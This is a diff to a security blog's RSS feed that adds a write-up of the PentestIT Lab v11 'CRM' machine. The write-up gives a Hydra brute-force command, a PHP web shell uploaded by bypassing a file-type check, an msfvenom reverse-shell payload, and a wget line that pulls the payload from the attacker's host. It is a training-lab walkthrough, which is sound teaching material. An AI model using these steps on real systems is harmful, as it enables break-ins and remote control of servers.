@@ -4,11 +4,95 @@
     <title>Another security blog</title>
     <description>My adventures in the Infosec world.
 </description>
-    <link>/</link>
-    <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 16 Nov 2015 15:45:44 -0800</pubDate>
-    <lastBuildDate>Mon, 16 Nov 2015 15:45:44 -0800</lastBuildDate>
-    <generator>Jekyll v3.0.0</generator>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Sun, 04 Mar 2018 01:22:00 -0800</pubDate>
+    <lastBuildDate>Sun, 04 Mar 2018 01:22:00 -0800</lastBuildDate>
+    <generator>Jekyll v3.7.3</generator>
+    
+      <item>
+        <title>PentestIT Lab v11 - CRM</title>
+        <description>&lt;p&gt;Opening the browser and going to 192.168.101.10 (TCP port 80), shows a welcome page for the lab. This seems to be a blog, and further look into the HTML code, I can see references to Wordpress links. Using WPscan, I learn this site is running the Kittycatfish plugin, which is vulnerable to a SQLi (&lt;a href=&quot;https://www.exploit-db.com/exploits/41919/&quot;&gt;WordPress Plugin KittyCatfish 2.2 - SQL Injection&lt;/a&gt;). My attempts to exploit this, either manually or through SQLmap, are unsuccessful. I suspect there’s some WAF in the middle as I’m getting forbidden responses when using SQLi attempts and also when bruteforcing the Wordpress admin login form. I move on to find something else as with an WAF in the middle, it will be difficult.&lt;/p&gt;
+
+&lt;p&gt;From the HTML code, I see a link to http://192.168.101.10:88. Going to the link, I can see there’s a Vtiger 6.3.0 web application. Further research, tells me this version is vulnerable to an &lt;a href=&quot;https://www.exploit-db.com/exploits/38345/&quot;&gt;Authenticated Remote Code Execution&lt;/a&gt;. Through some web searching, I learn the default credentials are admin:admin, however, I get a invalid username or password. Time to brute force the admin’s password.&lt;/p&gt;
+
+&lt;p&gt;I launch Burp and configure my browser to use it has a proxy. I then submit the login form with admin:admin credentials. From the Burp history, I get the POST data and the URL path I need to use. I then launch Hydra with the /usr/share/wordlist/sqlmap.txt wordlist from Kali:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;hydra 192.168.101.10 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 88 http-post-form &lt;span class=&quot;s2&quot;&gt;&quot;/index.php?module=Users&amp;amp;action=Login:__vtrftk=sid%3A0e9ffbd5aee2325cb3254c8d41253bbd7c4bd27a%2C1518930935&amp;amp;username=^USER^&amp;amp;password=^PASS^:error=1&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; admin &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; rockyou-60.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 20&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I use the rockyou-60.txt password list from the &lt;a href=&quot;https://github.com/danielmiessler/SecLists/tree/master/Passwords&quot;&gt;Seclists&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;In this login form, when the login fails, you get a 302 redirect to the login page again with the message “Invalid username or password”. However, Hydra doesn’t follow redirects, but I’ve noticed that on the 302 response, the Location header contains a error=1 parameter. That’s why I’m using it has the failed string.&lt;/p&gt;
+
+&lt;p&gt;Going back to the password brute force, after several minutes, Hydra spits the known password: &lt;b&gt;blackstar&lt;/b&gt;. Now, with an authenticated session in the Vtiger CRM application, I can try to use the previous exploit found:&lt;/p&gt;
+
+&lt;p&gt;I create a file 1.php with the content:&lt;/p&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;passthru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This uses the PHP short tags, as the application is checking if the content contains &amp;lt;?php.&lt;/p&gt;
+
+&lt;p&gt;I then go to Settings(Small gear on the top right) -&amp;gt; CRM Settings -&amp;gt; Templates -&amp;gt; Company Details -&amp;gt; Edit. I then click the Browse button to add my 1.php file, but first, I set Burp to intercept the form submit. However, there seems to be some Javascript to detect the file extension, which only permits images. I then change my 1.php to 1.jpg and submit the form again, this time with Burp intercept off. I then go to Burp’s history and send that POST request to Repeater. I then change the content of the filename from 1.jpg to 1.php and send the request again, maintaing the content type as jpeg:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;CompanyDetailsSave&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;-----------------------------&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2787963551806245971250936184&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disposition&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.php&quot;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jpeg&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;&amp;lt;?&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;passthru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Accessing the URL path &lt;code&gt;/test/logo/1.php?cmd=whoami&lt;/code&gt;, will tell me that I’m running with www-data user. Sending &lt;code&gt;/test/logo/1.php?cmd=uname -a&lt;/code&gt;, I can see this is a Debian Linux system.&lt;/p&gt;
+
+&lt;p&gt;Now it’s time to get a proper foothold into the system, so I can start doing proper enumeration. I generate a meterpreter with command:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux/x86/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;MY_VPN_IP&amp;gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; elf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 1.elf&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Launch a &lt;code&gt;python -m SimpleHTTPServer&lt;/code&gt; to serve the meterpreter and from the browser execute &lt;code&gt;/test/logo/1.php?cmd=wget http://MY_IP:8000/1.elf -O /tmp/1.elf&lt;/code&gt;. However, I get a gateway timeout, looks like the server is not allowing egress connections to TCP port 8000. I then tried with TCP port 80 and still no connection. Tried ping (&lt;code&gt;test/logo/1.php?cmd=ping -c1 -w1 MY_IP&lt;/code&gt;), and I get no response, so in the end, it looks like there’s more restrictions on the egress traffic. Looking at the file /etc/iptables.save (&lt;code&gt;/test/logo/1.php?cmd=cat /etc/iptables.save&lt;/code&gt;), I can see it’s allowing egress traffic only to 172.16.0.11 and 172.16.0.254:&lt;/p&gt;
+
+&lt;pre&gt;
+# Generated by iptables-save v1.4.14 on Thu Jul  4 02:14:19 2013
+*filter
+:INPUT ACCEPT [194:23274]
+:FORWARD ACCEPT [1268:354653]
+:OUTPUT ACCEPT [155:40731]
+
+## state,lo
+-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
+-A INPUT -i lo -j ACCEPT
+
+## icmp
+-A INPUT -p icmp --icmp-type 8 -j ACCEPT
+
+## ssh
+-A INPUT -p tcp --dport 22 -j ACCEPT
+
+## www
+-A INPUT -p tcp --dport 80 -j ACCEPT
+
+### DROP OTHER
+-A INPUT -j DROP
+
+## OUT
+-A OUTPUT -d 172.16.0.11 -j ACCEPT
+-A OUTPUT -d 172.16.0.254 -j ACCEPT
+
+-A OUTPUT -d 172.16.0.0/24 -j DROP
+&lt;/pre&gt;
+
+&lt;p&gt;At this point, my only option was to enumerate using the web shell. I’ve noticed that after a few minutes, my shell was gone, so I had to upload it again. Having the request ready in Burp Repeater was handy, because I had to upload the web shell many times.&lt;/p&gt;
+
+&lt;p&gt;From the webshell I go to &lt;code&gt;/var/www/rce_token.txt&lt;/code&gt; and get the CRM token.&lt;/p&gt;
+
+</description>
+        <pubDate>Sun, 04 Mar 2018 00:46:00 -0800</pubDate>
+        <link>http://localhost:4000/pentesting/2018/03/04/PentestIT-lab-v11-CRM.html</link>
+        <guid isPermaLink="true">http://localhost:4000/pentesting/2018/03/04/PentestIT-lab-v11-CRM.html</guid>
+        
+        
+        <category>Pentesting</category>
+        
+      </item>
     
       <item>
         <title>De-ICE S1.100 walkthrough</title>
@@ -208,8 +292,8 @@ root@kali:~# openssl enc -aes-128-cbc -d -in salary_dec2003.csv.enc -out salary_
 &lt;p&gt;&lt;img src=&quot;/images/screen11.png&quot; alt=&quot;Alt text&quot; /&gt;&lt;/p&gt;
 </description>
         <pubDate>Mon, 16 Nov 2015 12:55:41 -0800</pubDate>
-        <link>/pentesting/2015/11/16/deice-s1100.html</link>
-        <guid isPermaLink="true">/pentesting/2015/11/16/deice-s1100.html</guid>
+        <link>http://localhost:4000/pentesting/2015/11/16/deice-s1100.html</link>
+        <guid isPermaLink="true">http://localhost:4000/pentesting/2015/11/16/deice-s1100.html</guid>
         
         
         <category>Pentesting</category>
@@ -226,8 +310,8 @@ root@kali:~# openssl enc -aes-128-cbc -d -in salary_dec2003.csv.enc -out salary_
 
 </description>
         <pubDate>Mon, 16 Nov 2015 12:43:41 -0800</pubDate>
-        <link>/pentesting/2015/11/16/oscp-break.html</link>
-        <guid isPermaLink="true">/pentesting/2015/11/16/oscp-break.html</guid>
+        <link>http://localhost:4000/pentesting/2015/11/16/oscp-break.html</link>
+        <guid isPermaLink="true">http://localhost:4000/pentesting/2015/11/16/oscp-break.html</guid>
         
         
         <category>Pentesting</category>
